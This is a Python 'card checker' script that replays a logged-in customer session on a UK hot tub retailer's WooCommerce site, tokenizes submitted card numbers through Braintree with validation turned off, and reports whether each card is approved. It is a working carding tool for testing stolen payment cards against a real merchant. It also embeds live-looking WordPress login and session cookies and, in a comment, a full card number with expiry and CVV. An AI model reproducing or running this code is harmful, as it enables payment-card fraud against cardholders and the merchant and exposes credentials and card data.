def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	











	import requests

	cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'esale_number_dynamic_every_page': '01348858199',
    '_ga': 'GA1.1.1805518627.1726761586',
    'aa_click': '14098957664086814',
    '__stripe_mid': '511c1ddb-f227-4487-8668-852c8db824c4a765aa',
    '__stripe_sid': 'b63c10a7-918c-4b85-aa1e-92fe60724759b594fa',
    'wordpress_logged_in_aa79af48806932b5ccb036d6d955a819': 'negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e',
    'wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819': '20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759',
    'wfwaf-authcookie-69502fc676204955e38628a39ff999c4': '20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60',
    '_ga_E5SD97ZJ10': 'deleted',
    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_E5SD97ZJ10': 'GS1.1.1726761604.1.1.1726761726.0.0.0',
}

	headers = {
    'authority': 'castlehottubs.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; esale_number_dynamic_every_page=01348858199; _ga=GA1.1.1805518627.1726761586; aa_click=14098957664086814; __stripe_mid=511c1ddb-f227-4487-8668-852c8db824c4a765aa; __stripe_sid=b63c10a7-918c-4b85-aa1e-92fe60724759b594fa; wordpress_logged_in_aa79af48806932b5ccb036d6d955a819=negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e; wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819=20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759; wfwaf-authcookie-69502fc676204955e38628a39ff999c4=20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60; _ga_E5SD97ZJ10=deleted; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_E5SD97ZJ10=GS1.1.1726761604.1.1.1726761726.0.0.0',
    'referer': 'https://castlehottubs.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://castlehottubs.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)


	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
	







	import requests

	cookies = {
    'wordpress_sec_aa79af48806932b5ccb036d6d955a819': 'negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Cc37db7f8646f02d95112ddecd15ce235200d84d2e6373ed6fb21fb387426945d',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'esale_number_dynamic_every_page': '01348858199',
    '_ga': 'GA1.1.1805518627.1726761586',
    'aa_click': '14098957664086814',
    '__stripe_mid': '511c1ddb-f227-4487-8668-852c8db824c4a765aa',
    '__stripe_sid': 'b63c10a7-918c-4b85-aa1e-92fe60724759b594fa',
    'wordpress_logged_in_aa79af48806932b5ccb036d6d955a819': 'negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e',
    'wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819': '20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759',
    'wfwaf-authcookie-69502fc676204955e38628a39ff999c4': '20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60',
    '_ga_E5SD97ZJ10': 'deleted',
    '_ga_E5SD97ZJ10': 'GS1.1.1726761604.1.1.1726761730.0.0.0',
    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    'cookielawinfo-checkbox-necessary': 'yes',
    'cookielawinfo-checkbox-functional': 'no',
    'cookielawinfo-checkbox-performance': 'no',
    'cookielawinfo-checkbox-analytics': 'no',
    'cookielawinfo-checkbox-advertisement': 'no',
    'cookielawinfo-checkbox-others': 'no',
}

	headers = {
    'authority': 'castlehottubs.co.uk',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'wordpress_sec_aa79af48806932b5ccb036d6d955a819=negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Cc37db7f8646f02d95112ddecd15ce235200d84d2e6373ed6fb21fb387426945d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; esale_number_dynamic_every_page=01348858199; _ga=GA1.1.1805518627.1726761586; aa_click=14098957664086814; __stripe_mid=511c1ddb-f227-4487-8668-852c8db824c4a765aa; __stripe_sid=b63c10a7-918c-4b85-aa1e-92fe60724759b594fa; wordpress_logged_in_aa79af48806932b5ccb036d6d955a819=negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e; wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819=20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759; wfwaf-authcookie-69502fc676204955e38628a39ff999c4=20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60; _ga_E5SD97ZJ10=deleted; _ga_E5SD97ZJ10=GS1.1.1726761604.1.1.1726761730.0.0.0; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=no; cookielawinfo-checkbox-performance=no; cookielawinfo-checkbox-analytics=no; cookielawinfo-checkbox-advertisement=no; cookielawinfo-checkbox-others=no',
    'origin': 'https://castlehottubs.co.uk',
    'referer': 'https://castlehottubs.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'action': 'wc_braintree_paypal_get_client_token',
    'nonce': client_token_nonce,
}

	response = requests.post('https://castlehottubs.co.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	
	
	








	import requests

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '84203466-e2c2-42cf-8549-3dcce17df108',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"84203466-e2c2-42cf-8549-3dcce17df108"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4744760199779614","expirationMonth":"03","expirationYear":"2026","cvv":"681"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']




















	import requests

	cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'esale_number_dynamic_every_page': '01348858199',
    '_ga': 'GA1.1.1805518627.1726761586',
    'aa_click': '14098957664086814',
    '__stripe_mid': '511c1ddb-f227-4487-8668-852c8db824c4a765aa',
    '__stripe_sid': 'b63c10a7-918c-4b85-aa1e-92fe60724759b594fa',
    'wordpress_logged_in_aa79af48806932b5ccb036d6d955a819': 'negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e',
    'wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819': '20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759',
    'wfwaf-authcookie-69502fc676204955e38628a39ff999c4': '20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60',
    '_ga_E5SD97ZJ10': 'deleted',
    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_E5SD97ZJ10': 'GS1.1.1726761604.1.1.1726761726.0.0.0',
}

	headers = {
    'authority': 'castlehottubs.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; esale_number_dynamic_every_page=01348858199; _ga=GA1.1.1805518627.1726761586; aa_click=14098957664086814; __stripe_mid=511c1ddb-f227-4487-8668-852c8db824c4a765aa; __stripe_sid=b63c10a7-918c-4b85-aa1e-92fe60724759b594fa; wordpress_logged_in_aa79af48806932b5ccb036d6d955a819=negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e; wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819=20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759; wfwaf-authcookie-69502fc676204955e38628a39ff999c4=20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60; _ga_E5SD97ZJ10=deleted; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_E5SD97ZJ10=GS1.1.1726761604.1.1.1726761726.0.0.0',
    'origin': 'https://castlehottubs.co.uk',
    'referer': 'https://castlehottubs.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"43f72992682d9d5ccefb0c9eb75f7dbb"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"43f72992682d9d5ccefb0c9eb75f7dbb"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', add_nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post('https://castlehottubs.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)



	pattern = r'Status code (.*?)\s*</li>'
    
	text = response.text
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text or 'avs: Gateway Rejected: avs' in text:
			result = "1000: Approved"
		else:
			result = "Error"
		
			
	print(result)
	return result
	
